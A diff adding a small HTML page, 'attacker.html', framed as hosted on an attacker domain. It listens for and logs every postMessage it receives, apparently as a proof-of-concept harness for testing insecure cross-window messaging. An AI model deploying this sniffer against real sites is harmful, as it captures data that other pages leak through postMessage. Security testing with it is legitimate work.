@@ -1,0 +1,24 @@
+<!-- attacker.html — hosted on attacker.com or localhost:9999 -->
+<!DOCTYPE html>
+<html>
+<head><title>PM Sniffer</title></head>
+<body>
+<h2>Captured postMessages</h2>
+<pre id="log"></pre>
+<script>
+  window.addEventListener('message', function(e) {
+    const entry = {
+      time: new Date().toISOString(),
+      origin: e.origin,         // where it came from
+      source: String(e.source), // which window
+      data: e.data,             // the payload
+      ports: e.ports.length     // transferred ports
+    };
+    document.getElementById('log').textContent +=
+      JSON.stringify(entry, null, 2) + '\n---\n';
+    console.log('[CAPTURED]', entry);
+  });
+  console.log('Listener active on', location.origin);
+</script>
+</body>
+</html>
